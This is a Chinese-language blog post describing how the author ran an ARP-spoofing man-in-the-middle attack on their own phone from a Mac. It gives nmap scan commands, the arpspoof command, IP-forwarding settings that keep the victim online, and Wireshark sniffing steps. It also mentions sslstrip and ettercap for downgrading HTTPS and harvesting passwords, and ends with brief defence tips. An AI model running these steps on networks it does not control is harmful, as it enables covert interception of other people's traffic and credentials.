---
title: Macos进行局域网arp欺骗
date: 2016-05-10 11:09:02
tags: [osx, arpspoof, wireshark]
---

之前知乎看到一篇通过手机app就能直接监听到局域网内的其他用户的数据包，并且自动抓取图片和嗅探密码的答案，觉得这样也能成功实在太夸张了。于是自己实现一下，App开发不来，就在Mac上进行好了（事实上用到的也都是别人写好的程序）

#### 安装工具

首先安装[Macport](https://www.macports.org/), 它是一个类似于apt-get和brew的一个包管理工具，通过port我们可以很方便的安装需要的各种工具。

如果安装之后发现仍然找不到port命令的，可以

```
export PATH=/opt/local/bin:/opt/local/sbin:$PATH
```

将其加入到系统路径里来。

port安装好之后就可以开始安装各种工具了

```
sudo port install arpspoof
sudo port install nmap
```

其实还有`sslstrip`和`ettercap`，不过后面两个更多的用于攻击，我们只需要体验一下中间人攻击就好了，~~事实上是ettercap安装不成功~~。

#### nmap扫描整个局域网段

直接执行命令

```
sudo nmap -sS 192.168.1.0/24
```

结果如下：

```
Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-09 17:50 CST
Nmap scan report for 192.168.1.1
Host is up (0.0022s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
1900/tcp open  upnp
MAC Address: ▇▇:▇▇:▇▇:▇▇:▇▇:▇▇ (Tp-link Technologies)

Nmap scan report for 192.168.1.111
Host is up (0.0062s latency).
Not shown: 999 closed ports
PORT      STATE SERVICE
62078/tcp open  iphone-sync
MAC Address: ▇▇:▇▇:▇▇:▇▇:▇▇:▇▇ (Apple)

Nmap scan report for 192.168.1.112
Host is up (0.000017s latency).
All 1000 scanned ports on 192.168.1.112 are closed (500) or filtered (500)

Nmap done: 256 IP addresses (3 hosts up) scanned in 51.06 seconds
```

其中192.168.1.1是局域网的网关，192.168.1.111是我的手机，192.168.1.112是我的本机。这是特意趁家里只有我一个人的时候扫描的，一旦有其他人接入wifi，就会出现更多的结果。

暂时不清楚这个工具的原理，有的时候不会显示手机的结果，当然一个可能的原因是iphone待机时自动断wifi，而不是工具的锅。

扫描过后就可以通过查看路由表来查看局域网内的ip信息了

```
~netstat -r
Routing tables

Internet:
Destination        Gateway            Flags        Refs      Use   Netif Expire
default            192.168.1.254      UGSc          323        0     en0
127                localhost          UCS             1        0     lo0
localhost          localhost          UH             28  4818622     lo0
169.254            link#4             UCS             1        0     en0
192.168.1          link#4             UCS             4        0     en0
192.168.1.207      link#4             UHLWIi          1        2     en0
192.168.1.208      link#4             UHLWIi          1        2     en0
192.168.1.250/32   link#4             UCS             1        0     en0
192.168.1.254/32   link#4             UCS             2        0     en0
192.168.1.254      ▇▇:▇▇:▇▇:▇▇:▇▇:▇▇  UHLWIir       324       16     en0    171
192.168.1.255      link#4             UHLWbI          1       12     en0
224.0.0            link#4             UmCS            2        0     en0
224.0.0.251        ▇▇:▇▇:▇▇:▇▇:▇▇:▇▇  UHmLWI          1        0     en0
255.255.255.255/32 link#4             UCS             1        0     en0

Internet6:
Destination        Gateway            Flags         Netif Expire
localhost          localhost          UHL             lo0
fe80::%lo0         fe80::1%lo0        UcI             lo0
fe80::1%lo0        link#1             UHLI            lo0
fe80::%en0         link#4             UCI             en0
shaobos-macbook-pr ▇▇:▇▇:▇▇:▇▇:▇▇:▇▇  UHLI            lo0
fe80::%awdl0       link#9             UCI           awdl0
shaobos-macbook-pr ▇▇:▇▇:▇▇:▇▇:▇▇:▇▇  UHLI            lo0
ff01::%lo0         localhost          UmCI            lo0
ff01::%en0         link#4             UmCI            en0
ff01::%awdl0       link#9             UmCI          awdl0
ff02::%lo0         localhost          UmCI            lo0
ff02::%en0         link#4             UmCI            en0
ff02::%awdl0       link#9             UmCI          awdl0
```
这是我在公司未扫描时的结果，可以看到只包含部分信息，但是如果`ping`一个不在表内的ip，这个新的ip就会被添加到路由表中。

通过这个步骤，我们就能知道局域网里还有哪些机器，然后我们就可以选定一个目标，开始攻击了。

#### arp欺骗
这里选用我的手机192.168.1.111进行攻击，使用`arpspoof`。

```
arpspoof -i en0 -t 192.168.1.111 192.168.1.1
```

这个命令是告诉192.168.1.111这个机器，我是192.168.1.1，也就是你的网关，你的包就发给我吧，这样我就能在我的en0上监听到来自192.168.1.111的发包了。

但是这样一来，192.168.1.111就断网了，因为它的包发给了我，而没能转发出去。这个时候手机上会出现一个比较奇怪的现象，就是微信能收到小伙伴的消息，但是却发不出去。实测有极少量的消息还是发送出去了，可能是由于我们的arp欺骗是持续反复进行的，中间的间隙导致了包还是发给了网管。但是无论如何，这个时候目标机器的网络连接是不正常的。

#### ip转发

打开ip转发功能后，就能把192.168.1.111的包转发给网管了，命令如下：

```
sysctl -w net.inet.ip.forwarding=1
```

本来以为会有各种复杂的设置，比如哪些转发，哪些不转，比如怎么转，转到哪去之类的。结果发现，打开之后，我的手机直接就能正常上网了，丝毫没有异样。~~这时，我们就能放心大胆的进行监听而不用担心被发现了~~。

#### 抓包

抓包的方法很多，最方便的还是[wireshark](https://www.wireshark.org/)。直接监听之前设置的端口en0，然后设置过滤条件`ip.src == 192.168.1.111`，然后就可以看到目标机器的各种请求了。

这里上个监听结果的图

![](/uploads/sniffer_result.png)

其中，右上角的小图是我的朋友圈截图，大图是我在手机上点开图片之后，在Mac上监听到的请求，然后在浏览器上打开的结果。如果是在看视频，则会监听到连续的视频片段，可以一段一段下载下来看到。

#### More
当然我们这里仅仅监听了目标机器发送的包，同样的原理，我们可以欺骗网关，我们才是目标机器，这样我们就能监听到双向的消息了，而且目标机器仍然能够正常上网。

在这基础上，通过`sslstrip`可以建立假的`https`链接，这样就能明文看到本来是通过`https`加密过的消息，但是这样一来，目标机器是否还能正常使用不明，有待后续尝试。

通过`ettercap`则可以方便的完成上述过程，并且自动嗅探出其中的账号密码信息，估计就是加入一些常用的账号密码字段，或者关键字来提取的吧。

#### 防范
可以看到，这个方法的杀伤力还是很可怕的，虽然伤害范围有限，但是如果应用到出租屋，宾馆这种环境中，还是非常危险的。所以在公共场合还是尽量少的链接公共wifi。

关于防范措施，要么没必要防范，比如自己家中的wifi，设好密码不让外人连就好，要么没有权限防范，比如宾馆这种，路由不归你管。如果要在自己机器这个层面上防范暂时不知道有没有什么简单的方法，windows机器可以安装360防火墙，手机不明。

所以最好的方法还是定期修改密码，所有账号都绑定手机和安全邮箱，在公共wifi不登录敏感的账号等等。
